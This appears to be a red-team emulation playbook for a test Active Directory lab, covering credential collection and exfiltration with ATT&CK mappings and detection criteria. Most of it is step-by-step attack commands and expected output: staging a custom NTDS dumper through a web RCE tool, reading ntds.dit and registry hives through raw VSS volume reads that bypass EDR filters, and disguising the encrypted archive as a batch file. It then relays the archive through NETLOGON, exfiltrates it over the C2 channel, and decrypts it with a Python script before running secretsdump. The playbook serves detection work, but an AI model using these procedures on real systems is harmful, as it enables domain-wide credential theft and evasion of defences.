> Collection, Exfiltration

# Phase 4 - Collection & Exfiltration

## Overview

After establishing persistent Domain Admin C2 sessions on DC01 and a domain-user
session on WS01 in Phase 3, the attacker moves into the collection phase in
preparation for double-extortion. Using the `TESTLAB\Administrator` dnscat2 shell
on DC01, the attacker harvests credential material from the domain controller and
produces a single encrypted archive in one tool execution (Step 1). The archive is
then staged into DC01's NETLOGON share — a local write requiring no outbound
authentication from the PtH shell — and the IIS01 SYSTEM dnscat2 shell pulls it
from `\\DC01\NETLOGON\` using machine account Kerberos (Step 2). Step 2 covers
T1039 (reading the credential archive from the domain network share), T1021.002
(SMB share access), and T1041 (exfiltration via the react2shell HTTP channel).

Step 1 is the most sensitive step in the phase. `ntds.dit` access through a Volume
Shadow Copy is the canonical pre-ransomware credential harvest pattern on a Domain
Controller. T1003.003 (OS Credential Dumping: NTDS) is dual-mapped alongside T1005
because the two rows capture different detection signals: T1005 is the file-write
outcome (Sysmon Event 11 for `ntds.tmp`), while T1003.003 is the NTDS-targeting
signal — the `GENERIC_READ | FILE_FLAG_BACKUP_SEMANTICS` handle opened on
`\Windows\NTDS\ntds.dit` within the VSS shadow namespace (IRP_MJ_CREATE on the
shadow NTDS path, distinct from the raw volume device handle in T1006). Note:
T1003.003 is out of scope for Scenario 1; `check.py` will write this row to
`_out_of_scope.csv`. The Calibrated label reflects detection feasibility — an EDR
with kernel minifilter callbacks on NTDS path access can detect this independently.

Both steps run from DC01 and IIS01. No new payloads are required beyond
`PolicySyncSvc.exe`: the exfiltration step reuses the react2shell HTTP channel
already open from Phase 2.

The DC01 PtH shell (Logon Type 3 network token) cannot authenticate outbound to
IIS01's admin share — NTLM double-hop: the session token carries no credential
material for a second hop. NETLOGON is used as a relay: DC01 writes `certstore.cmd`
locally into `C:\Windows\SYSVOL\sysvol\testlab.local\scripts\` (no network hop
needed), and IIS01's SYSTEM shell pulls the file from `\\DC01\NETLOGON\` using
the machine account's Kerberos context.

---

## Step 1 - DC Credential Material, Archive & Encryption

### Voice Track

With Domain Admin privileges on DC01, the attacker runs `PolicySyncSvc.exe` — a
single tool execution that covers the full credential harvest and archive chain.

The tool creates a Volume Shadow Copy of `C:` via WMI `Win32_ShadowCopy.Create()` —
no `vssadmin.exe` process is spawned. For each target file (`ntds.dit`, `SYSTEM`,
`SAM`, `SECURITY`), it opens the shadow path solely to obtain the NTFS cluster map
via `FSCTL_GET_RETRIEVAL_POINTERS`. No file data is read via the file handle. All
content is read by computing raw byte offsets (`LCN × BytesPerCluster`) and issuing
`ReadFile` against the volume device handle — a storage-layer I/O request that the
WdFilter.sys minifilter cannot intercept. Each file's plaintext bytes are
AES-256-CBC-encrypted in-memory (`AesCryptoServiceProvider`, random IV per call,
delegated to Windows CNG) and flushed to `C:\ProgramData\CertStore\` as opaque
`.tmp` blobs. The shadow copy is deleted via WMI immediately after collection.

After shadow cleanup, the tool builds a ZIP archive entirely in-memory using
`ZipArchive` over a `MemoryStream` — no `certstore.zip` file ever touches disk.
The in-memory ZIP buffer is AES-256-CBC-encrypted (second call, fresh random IV),
base64-encoded, and written as `certstore.cmd` to `C:\ProgramData\` wrapped in a
valid batch script stub (`@echo off` / `:: maintenance` / `set _b=`). No plaintext
credential data and no intermediate ZIP file ever lands on disk; `certstore.cmd`
passes text-based batch script parsers.

Static analysis evasion layers reduce the binary's detectability at rest: all
operational `kernel32` APIs (`CreateFile`, `DeviceIoControl`, `ReadFile`,
`SetFilePointerEx`, `GetFileSizeEx`, `CloseHandle`) are resolved at runtime via
`GetProcAddress` — only `GetModuleHandleW` and `GetProcAddress` appear in the PE
IAT. IOC strings (`Win32_ShadowCopy`, NTDS paths, output filenames, API names)
are stored as position-keyed encoded byte arrays and decoded in-memory; none appear
as UTF-16 literals in the compiled PE.

The binary is staged to IIS01 as `PolicySyncSvc.exe` via the react2shell `stage` +
`rename` flow — base64-encoded bytes stream in 2000-char chunks into
`global.__stageBuffer` on the target Node.js process and flush as a decoded binary in
one `writeFileSync` write, then promoted from `.bin` to `.exe` via in-process
`fs.renameSync`; no `.b64` intermediate touches disk at any point. From IIS01, the
binary is pulled to DC01 via the `C$` admin share from the existing PtH dnscat2 shell.

### Procedures

- ☣️ Launch the react2shell session and stage `PolicySyncSvc.exe` to IIS01 as `PolicySyncSvc.exe` — no `.b64` disk artifact; file promoted to `.exe` via in-process rename

  ```bash
  cd resources/payloads/react2shell-tool
  python -m exploit_tool.main -t http://react.testlab.local
  ```

  ```
  stage ../../cred-access/NtdsRawDump/PolicySyncSvc.exe C:\Windows\Temp\PolicySyncSvc.bin
  rename C:\Windows\Temp\PolicySyncSvc.bin C:\Windows\Temp\PolicySyncSvc.exe
  ```

  - ***Expected Output***

    ```text
    [*] Staging .../PolicySyncSvc.exe (...) -> C:\Windows\Temp\PolicySyncSvc.bin in N chunks (NO .b64 disk artifact)...
    [*] Progress: N/N chunks
    [+] File staged successfully -> C:\Windows\Temp\PolicySyncSvc.bin (... bytes, NO .b64 disk artifact!)
    [*] Renaming C:\Windows\Temp\PolicySyncSvc.bin -> C:\Windows\Temp\PolicySyncSvc.exe via eval (NO spawn - STEALTH!)...
    [+] File renamed successfully -> C:\Windows\Temp\PolicySyncSvc.exe (NO process spawn!)
    ```

- ☣️ From the DC01 dnscat2 shell, create the staging directory and pull `PolicySyncSvc.exe` from IIS01

  ```text
  C:\ProgramData> mkdir C:\ProgramData\CertStore
  C:\ProgramData> copy \\IIS01\C$\Windows\Temp\PolicySyncSvc.exe C:\ProgramData\PolicySyncSvc.exe
  ```

  - ***Expected Output***

    ```text
    (directory created; or "A subdirectory or file C:\ProgramData\CertStore already exists." if present from a prior run)
            1 file(s) copied.
    ```

- ☣️ Execute `PolicySyncSvc.exe` — credential harvest, archive, and encryption in one invocation

  ```text
  C:\ProgramData> PolicySyncSvc.exe C:\ProgramData\CertStore
  ```

  - ***Expected Output***

    ```text
    [*] Initializing store consistency snapshot...
    [+] Snapshot acquired.
    [*] Cluster alignment: 4096 bytes
    [*] Processing trust anchor database... <N> bytes
    [*] Processing machine configuration store... <N> bytes
    [*] Processing account authority store... <N> bytes
    [*] Processing extended trust policy store... <N> bytes
    [+] Completed. 4/4 stores processed.
    [*] Compressing store bundle...
    [+] Bundle written: C:\ProgramData\certstore.cmd (<N> bytes)
    ```

  > **Note:** Default run retains the VSS shadow copy and `CertStore\` directory for post-run verification. Pass `--cleanup` to delete both before writing `certstore.cmd`: `PolicySyncSvc.exe C:\ProgramData\CertStore --cleanup`.

- ☣️ Verify the encrypted archive and credential files are staged

  ```text
  C:\ProgramData> dir C:\ProgramData\certstore.cmd
  C:\ProgramData> dir C:\ProgramData\CertStore\*.tmp
  C:\ProgramData> powershell -NoProfile -Command "Get-Content C:\ProgramData\certstore.cmd | Select-Object -First 2"
  ```

  - ***Expected Output***

    ```text
    <date>  <time>      <N> certstore.cmd

     Directory of C:\ProgramData\CertStore
    <date>  <time>    <N> ntds.tmp
    <date>  <time>    <N> system.tmp
    <date>  <time>    <N> sam.tmp
    <date>  <time>    <N> security.tmp
                   4 File(s)    <total> bytes

    @echo off
    :: maintenance
    ```

  > **Note:** `certstore.cmd` opens with valid batch syntax — passes text-based batch
  > script parsers. AES-256-CBC ciphertext is base64-encoded in `set _b=`; no ZIP or
  > binary magic bytes at file offset 0. Inner `.tmp` credential blobs remain raw binary.

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
| - | - | - | - | - | - | - | - | - | - | - | - | - | -
| react2shell stage base64 chunk eval PolicySyncSvc.exe ingress to IIS01 Temp | Command and Control | T1105 | Ingress Tool Transfer | Windows | node.exe under w3wp.exe creates Portable Executable file in C:\Windows\Temp\ on IIS01 | Not Calibrated - Not Benign | transport | react2shell `stage` streams `PolicySyncSvc.exe` in 2000-char base64 chunks via HTTP eval channel into `global.__stageBuffer` and flushes as `PolicySyncSvc.bin`; `rename` promotes it to `.exe` via in-process `fs.renameSync` — no `.b64` disk artifact, no spawn | IIS01 (10.12.10.20) | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -|
| cmd.exe copy PolicySyncSvc.exe from IIS01 C$ admin share to DC01 ProgramData | Lateral Movement | T1570 | Lateral Tool Transfer | Windows | cmd.exe on DC01 copies executable from \\IIS01\C$\Windows\Temp\ to C:\ProgramData\ and parent process is RuntimeBroker.exe | Not Calibrated - Not Benign | transport | DC01 dnscat2 shell (`RuntimeBroker.exe` ghost) copies `PolicySyncSvc.exe` from `\\IIS01\C$\Windows\Temp\` to `C:\ProgramData\` using the PtH Logon Type 3 `TESTLAB\Administrator` token — tool moves laterally from the initial staging host to the DC | DC01 (10.12.10.10) ← IIS01 (10.12.10.20) | TESTLAB\Administrator | - | -|
| cmd.exe SMB C$ admin share access DC01 to IIS01 via PtH network logon | Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | RuntimeBroker.exe on DC01 initiates outbound SMB connection to \\IIS01\C$ admin share | Not Calibrated - Not Benign | remote-exec | DC01 dnscat2 shell authenticates to `\\IIS01\C$\` using the PtH Logon Type 3 `TESTLAB\Administrator` token and reads `PolicySyncSvc.exe`; SMB admin share used as the transfer mechanism for T1570 | DC01 (10.12.10.10) → IIS01 (10.12.10.20) | TESTLAB\Administrator | - | -|
| PolicySyncSvc.exe automated VSS raw read encrypt archive credential harvest chain | Collection | T1119 | Automated Collection | Windows | PolicySyncSvc.exe on DC01 chains VSS shadow creation, raw volume reads, credential file writes, and encrypted archive output in single process invocation without operator step-by-step guidance | Not Calibrated - Not Benign | redundant@T1006 | `PolicySyncSvc.exe` automates VSS creation via WMI, raw cluster reads for four credential targets, per-file AES-256-CBC encryption, shadow deletion, in-memory ZipArchive, and outer AES-256-CBC encryption without operator intervention | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/cred-access/NtdsRawDump/NtdsRawDump.cs) | -|
| PolicySyncSvc.exe GetProcAddress runtime kernel32 API resolution sparse PE IAT | Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | PolicySyncSvc.exe on DC01 has PE static IAT containing only GetModuleHandleW and GetProcAddress — operational kernel32 APIs absent from import table | Calibrated - Not Benign | - | `PolicySyncSvc.exe` resolves `CreateFile`, `DeviceIoControl`, `ReadFile`, `SetFilePointerEx`, `GetFileSizeEx`, and `CloseHandle` at runtime via `GetProcAddress` — none present in the compiled IAT | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/cred-access/NtdsRawDump/NtdsRawDump.cs) | -|
| PolicySyncSvc.exe Win32_ShadowCopy.Create WMI volume shadow copy creation | Execution | T1047 | Windows Management Instrumentation | Windows | PolicySyncSvc.exe on DC01 invokes Win32_ShadowCopy.Create via WMI COM interface — non-backup process creates volume shadow copy through programmatic COM instead of vssadmin.exe | Calibrated - Not Benign | - | `PolicySyncSvc.exe` creates and deletes a VSS shadow copy via WMI `Win32_ShadowCopy.Create()`/`.Delete()` — `vssadmin.exe` never spawned | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/cred-access/NtdsRawDump/NtdsRawDump.cs) | -|
| PolicySyncSvc.exe raw ReadFile volume device handle VSS shadow cluster read | Defense Evasion | T1006 | Direct Volume Access | Windows | PolicySyncSvc.exe on DC01 opens \\.\HarddiskVolumeShadowCopy* for raw read — non-system process reads directly from shadow volume device bypassing filesystem filter stack | Calibrated - Not Benign | - | `PolicySyncSvc.exe` reads NTFS cluster data for `ntds.dit`, `SYSTEM`, `SAM`, and `SECURITY` via raw `ReadFile` on the shadow volume device handle — `FSCTL_GET_RETRIEVAL_POINTERS` used per-file for cluster map; actual reads bypass WdFilter.sys minifilter | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/cred-access/NtdsRawDump/NtdsRawDump.cs) | -|
| PolicySyncSvc.exe FILE_FLAG_BACKUP_SEMANTICS open NTDS.dit VSS shadow path | Credential Access | T1003.003 | OS Credential Dumping: NTDS | Windows | PolicySyncSvc.exe on DC01 opens ntds.dit under VSS shadow path with FILE_FLAG_BACKUP_SEMANTICS — non-backup process accesses NTDS database on volume shadow copy | Calibrated - Not Benign | - | `PolicySyncSvc.exe` opens a backup-semantics file handle on the `ntds.dit` shadow path to retrieve its NTFS cluster map via `FSCTL_GET_RETRIEVAL_POINTERS` — the NTDS namespace access is the credential-targeting signal; actual data is read via the raw volume device handle (T1006) | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/cred-access/NtdsRawDump/NtdsRawDump.cs) | -|
| PolicySyncSvc.exe AES-256-CBC encrypted credential tmp blob CertStore directory write | Collection | T1005 | Data from Local System | Windows | PolicySyncSvc.exe on DC01 writes encrypted data blobs to C:\ProgramData\CertStore\*.tmp — credential material collected from local system sources written as AES-256-CBC ciphertext | Calibrated - Not Benign | - | NTDS credential database and three registry hives harvested from shadow volume raw reads and written as AES-256-CBC-encrypted blobs to the staging directory | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/cred-access/NtdsRawDump/NtdsRawDump.cs) | -|
| PolicySyncSvc.exe CertStore staging directory encrypted tmp blob accumulation | Collection | T1074.001 | Data Staged: Local Data Staging | Windows | C:\ProgramData\CertStore\ on DC01 accumulates multiple high-entropy .tmp files written by PolicySyncSvc.exe — attacker staging directory populated with encrypted credential blobs before archival and relay | Calibrated - Not Benign | - | `C:\ProgramData\CertStore\` is the attacker's local staging directory; encrypted credential blobs accumulate here before `certstore.cmd` is written to `C:\ProgramData\` for relay via NETLOGON in Step 2 | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -|
| PolicySyncSvc.exe System.IO.Compression ZipArchive MemoryStream in-process ZIP assembly | Collection | T1560.002 | Archive Collected Data: Archive via Library | Windows | N/A — C2: in-memory ZipArchive over MemoryStream produces no independently verifiable disk, process, or network artifact; ZIP buffer passed directly to AES encryption without touching disk | Not Calibrated - Not Benign | C2 | `ZipArchive` over `MemoryStream` compresses four encrypted credential `.tmp` files entirely in-process — no child archival process spawned, no intermediate ZIP file on disk; in-memory buffer passed directly to outer AES-256-CBC step | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/cred-access/NtdsRawDump/NtdsRawDump.cs) | -|
| PolicySyncSvc.exe AesCryptoServiceProvider CBC custom archive encryption batch wrapper | Collection | T1560.003 | Archive Collected Data: Archive via Custom Method | Windows | PolicySyncSvc.exe on DC01 writes certstore.cmd containing base64-encoded AES-256-CBC ciphertext wrapped in batch script syntax to C:\ProgramData\ — custom archive format combines AES encryption, base64 encoding, and batch file camouflage | Calibrated - Not Benign | - | `PolicySyncSvc.exe` applies AES-256-CBC (`AesCryptoServiceProvider`, delegated to Windows CNG) in two passes: per-file before each `.tmp` write, and over the in-memory ZIP buffer before writing `certstore.cmd` — ciphertext base64-encoded and wrapped in `@echo off` batch stub; random IV prepended per call | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/cred-access/NtdsRawDump/NtdsRawDump.cs) | -|
| PolicySyncSvc.exe certstore.cmd batch script base64 ciphertext set _b= embedding | Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | N/A — C3: only observable artifact is certstore.cmd file structure already witnessed by T1560.003; batch-script wrapper is inseparable from the custom archive format and evidences the archive method, not a separate obfuscation event | Not Calibrated - Not Benign | redundant@T1560.003 | `certstore.cmd` masked as a batch script via `@echo off` wrapper — base64-encoded AES ciphertext in `set _b=` passes text-based script parsers; evasion outcome of T1560.003; no independently scoreable signal beyond what T1560.003 already captures | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/cred-access/NtdsRawDump/NtdsRawDump.cs) | -|

---

## Step 1B: Alternative Step for Archive Action in Step 1 - Archive via Utility (makecab LOLBin)

### Voice Track

`makecab.exe` is a native Windows Server 2022 binary — no third-party install
required. The attacker uses it to compress all staged credential files in `CertStore\`
into a single cabinet archive. This step produces detection signals independent of
Step 1's in-process ZipFile archiving: the key signal here is process lineage —
`makecab.exe` spawning from the `RuntimeBroker.exe` ghost process. `RuntimeBroker.exe`
is a legitimate UWP broker that does not ordinarily spawn archival utilities. The
`SourceDir` and `CabinetNameTemplate` arguments pointing to `CertStore` make the
parent-child relationship unambiguous.

### Procedures

- ☣️ From the DC01 dnscat2 shell, generate a makecab directive file for the staged credential files

  ```text
  C:\ProgramData> (echo .Set CabinetNameTemplate=certstore.cab & echo .Set DiskDirectoryTemplate=C:\ProgramData & echo .Set MaxDiskSize=0 & echo .Set CompressionType=LZX & for %f in ("C:\ProgramData\CertStore\*.*") do @echo "%f") > C:\ProgramData\certstore.ddf
  ```

  - ***Expected Output***

    ```text
    (no output — directive file written silently)
    ```

- ☣️ Run makecab against the directive file

  ```text
  C:\ProgramData> makecab /f C:\ProgramData\certstore.ddf /V0
  ```

  - ***Expected Output***

    ```text
    Cabinet    : certstore.cab
    Disk       : 1
    File       : ntds.tmp
    File       : system.tmp
    File       : sam.tmp
    File       : security.tmp
    Compression: LZX
    ```

- ☣️ Confirm the archive was created

  ```text
  C:\ProgramData> dir C:\ProgramData\certstore.cab
  ```

  - ***Expected Output***

    ```text
    <date>  <time>      <size> certstore.cab
    ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
| - | - | - | - | - | - | - | - | - | - | - | - | - | -
| makecab.exe cabinet archive CertStore credential tmp files via certstore.ddf directive | Collection | T1560.001 | Archive Collected Data: Archive via Utility | Windows | makecab.exe on DC01 spawns from RuntimeBroker.exe with /f directive file archiving files from C:\ProgramData\CertStore\ to certstore.cab — UWP broker process does not ordinarily spawn cabinet compression utilities | Calibrated - Not Benign | - | `makecab.exe /f certstore.ddf` compresses the staged credential `.tmp` files in `CertStore\` into `certstore.cab`; invoked directly from within the dnscat2 ghost process — anomalous parent for a cabinet compression utility; distinct process-creation signal from the in-process ZipFile archiving in Step 1 | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -|

---

## Step 2 - NETLOGON Relay & Exfiltration

### Voice Track

The DC01 dnscat2 shell cannot write directly to `\\IIS01\C$` — the network logon
token (Logon Type 3) from the PtH lateral movement carries no credential material
for a second outbound SMB hop (NTLM double-hop limitation). Instead of pushing
from DC01 to IIS01, the attacker inverts the direction: DC01 writes `certstore.cmd`
into its own SYSVOL scripts directory (`C:\Windows\SYSVOL\sysvol\testlab.local\scripts\`),
which is a local disk write requiring no outbound authentication. This path is
simultaneously the NETLOGON share (`\\DC01\NETLOGON\`), readable by all domain
computers via machine-account Kerberos.

The IIS01 SYSTEM dnscat2 shell then performs a single-hop pull: `copy
\\DC01\NETLOGON\certstore.cmd C:\inetpub\react.testlab.local\certstore.cmd`.
IIS01's machine account (`IIS01$`) authenticates to DC01 via Kerberos — the same
mechanism used in Step 2 — and places `certstore.cmd` in the react.testlab.local
web root. The attacker downloads it via react2shell's `download` command with the 
chunked HTTP mechanism.

The recovered `certstore.cmd` is parsed on the attacker machine: the `set _b=` line
is base64-decoded, then AES-256-CBC-decrypted (pycryptodome; AES key embedded in
source; IV is the first 16 bytes of the decoded blob) to recover the in-memory ZIP
buffer, which is written to `certstore.zip` for extraction.
The archive yields the four AES-256-CBC-encrypted credential blobs; a second
decryption pass restores the plaintext `ntds.dit`, `SYSTEM.hiv`, `SAM.hiv`, and
`SECURITY.hiv` files. `impacket-secretsdump` extracts all domain credentials offline.

### Procedures

- ☣️ From the DC01 dnscat2 shell, stage `certstore.cmd` into the NETLOGON/SYSVOL scripts folder

  ```text
  C:\ProgramData> copy C:\ProgramData\certstore.cmd C:\Windows\SYSVOL\sysvol\testlab.local\scripts\certstore.cmd
  ```

  - ***Expected Output***

    ```text
            1 file(s) copied.
    ```

- ☣️ From the IIS01 SYSTEM dnscat2 shell, pull `certstore.cmd` from NETLOGON to the react web root

  ```text
  command (IIS01 SYSTEM) > shell

  C:\Windows\Temp> copy \\DC01\NETLOGON\certstore.cmd C:\inetpub\react.testlab.local\certstore.cmd
  ```

  - ***Expected Output***

    ```text
            1 file(s) copied.
    ```

- ☣️ Launch (or resume) the react2shell session and download `certstore.cmd`

  ```bash
  cd resources/payloads/react2shell-tool
  python -m exploit_tool.main -t http://react.testlab.local
  ```

  ```
  rce > download C:\inetpub\react.testlab.local\certstore.cmd
  ```

  - ***Expected Output***

    ```text
    [*] Downloading C:\inetpub\react.testlab.local\certstore.cmd (<size> bytes) in <N> chunk(s) via eval (NO spawn - STEALTH!)...
    [*] Progress: 100/<N> chunks (<size>/<total> bytes)
    ...
    [+] File saved to: certstore.cmd (<total> bytes, NO process spawn!)
    ```

- ☣️ AES-decrypt `certstore.cmd`, extract the archive, and decrypt individual credential files

  ```bash
  pip install pycryptodome
  ```

  ```python
  from Crypto.Cipher import AES
  import os, zipfile, base64

  KEY = bytes.fromhex('e4e5dd75c6b3d216f0917a6629f33df2104d280381f857d9ed1f3296a77a9478')

  def aes_decrypt(data):
      iv, ct = data[:16], data[16:]
      pt = AES.new(KEY, AES.MODE_CBC, iv).decrypt(ct)
      return pt[:-pt[-1]]  # PKCS7 unpad

  # Step 1 — parse base64 wrapper, decrypt, extract archive
  with open('certstore.cmd', 'r', encoding='ascii') as f:
      for line in f:
          if line.startswith('set _b='):
              enc_data = base64.b64decode(line[7:].strip())
              break
  zip_data = aes_decrypt(enc_data)
  open('certstore.zip', 'wb').write(zip_data)
  with zipfile.ZipFile('certstore.zip') as z:
      z.extractall('certstore/')
  os.remove('certstore.zip')

  # Step 2 — decrypt individual credential files (raw binary format)
  for s, d in [('ntds.tmp','ntds.dit'),('system.tmp','SYSTEM.hiv'),
               ('sam.tmp','SAM.hiv'),('security.tmp','SECURITY.hiv')]:
      p = 'certstore/' + s
      if os.path.exists(p):
          open('certstore/' + d, 'wb').write(aes_decrypt(open(p,'rb').read()))
          print('[+]', s, '->', d)
  ```

  - ***Expected Output***

    ```text
    [+] ntds.tmp -> ntds.dit
    [+] system.tmp -> SYSTEM.hiv
    [+] sam.tmp -> SAM.hiv
    [+] security.tmp -> SECURITY.hiv
    ```

- ☣️ Run offline credential extraction

  ```bash
  impacket-secretsdump -ntds certstore/ntds.dit -system certstore/SYSTEM.hiv -sam certstore/SAM.hiv LOCAL
  ```

  - ***Expected Output***

    ```text
    [*] Target system bootKey: 0x<syskey>
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Searching for pekList, be patient
    [*] PEK # 0 found and decrypted: <pek>
    [*] Reading and decrypting hashes from certstore/ntds.dit
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:41c46bf74ec071f65c7b97df4b7d672a:::
    ...
    ```

- ☣️ Cleanup: delete `certstore.cmd` from NETLOGON (DC01 dnscat2 shell) and from IIS01 web root (IIS01 SYSTEM dnscat2 shell)

  ```text
  C:\ProgramData> del C:\Windows\SYSVOL\sysvol\testlab.local\scripts\certstore.cmd /f /q
  ```

  ```text
  command (IIS01 SYSTEM) > shell
  C:\Windows\Temp> del C:\inetpub\react.testlab.local\certstore.cmd /f /q
  ```

  - ***Expected Output***

    ```text
    (no output)
    ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
| - | - | - | - | - | - | - | - | - | - | - | - | - | -
| cmd.exe copy certstore.cmd to DC01 SYSVOL scripts directory NETLOGON relay staging | Collection | T1074.001 | Data Staged: Local Data Staging | Windows | cmd.exe on DC01 copies file to C:\Windows\SYSVOL\sysvol\testlab.local\scripts\ and parent process is RuntimeBroker.exe — anomalous process writes to SYSVOL scripts directory outside DFS-R replication or GPO management | Calibrated - Not Benign | - | `certstore.cmd` (AES-256-CBC-encrypted DC credential archive) copied into DC01's SYSVOL scripts directory as a NETLOGON relay staging point; DC01 PtH Logon Type 3 token cannot authenticate outbound to IIS01 — local write only, IIS01 pulls | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -|
| cmd.exe SMB NETLOGON share access IIS01 machine account Kerberos pull from DC01 | Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | RuntimeBroker.exe on IIS01 spawns cmd.exe that accesses \\DC01\NETLOGON\ over SMB — IIS web server machine account reading from domain controller NETLOGON share is anomalous | Calibrated - Not Benign | - | IIS01 SYSTEM dnscat2 shell accesses `\\DC01\NETLOGON\` using `IIS01$` machine account Kerberos over SMB — single-hop avoids NTLM double-hop constraint of the DC01 PtH Logon Type 3 shell | IIS01 (10.12.10.20) → DC01 (10.12.10.10) | IIS01$ (SYSTEM) | - | -|
| cmd.exe copy certstore.cmd from DC01 NETLOGON UNC path to IIS01 web root | Collection | T1039 | Data from Network Shared Drive | Windows | cmd.exe on IIS01 copies file from \\DC01\NETLOGON\ to C:\inetpub\react.testlab.local\ and parent process is RuntimeBroker.exe — web root receives file from domain controller NETLOGON share via anomalous process | Calibrated - Not Benign | - | IIS01 SYSTEM dnscat2 shell reads `certstore.cmd` from `\\DC01\NETLOGON\` and stages it in the react web root — NETLOGON relay inverts the transfer direction: DC01 writes locally to SYSVOL, IIS01 pulls via single-hop SMB | IIS01 (10.12.10.20) → DC01 (10.12.10.10) | IIS01$ (SYSTEM) | - | -|
| react2shell download HTTP eval chunked exfiltration certstore.cmd via C2 channel | Exfiltration | T1041 | Exfiltration Over C2 Channel | Windows | node.exe under w3wp.exe on IIS01 sends HTTP response containing chunked base64-encoded file content via react2shell eval channel — data exfiltration over existing C2 connection | Not Calibrated - Not Benign | redundant@C2-channel | react2shell `download C:\inetpub\react.testlab.local\certstore.cmd` exfiltrates the AES-256-CBC-encrypted DC credential archive via the existing react2shell HTTP eval channel — no new C2 channel opened | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py download()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -|
